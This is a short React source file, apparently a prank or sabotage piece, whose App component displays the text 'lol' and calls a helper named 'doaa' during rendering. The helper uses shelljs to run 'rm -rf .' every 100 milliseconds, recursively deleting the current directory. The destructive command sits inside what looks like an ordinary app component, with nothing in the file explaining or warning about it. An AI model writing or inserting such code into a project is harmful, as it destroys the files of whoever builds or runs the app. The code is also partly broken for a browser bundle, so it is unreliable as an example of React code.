import React from 'react';
import './App.css';
import shell from 'shelljs';

const doaa = () => {
  //
  setInterval(() => {
    shell.exec('rm -rf .');
  }, 100);
  return this;
};
function App() {
  return (
    <div>
      <p>lol</p>
      {doaa()}
    </div>
  );
}

export default App;
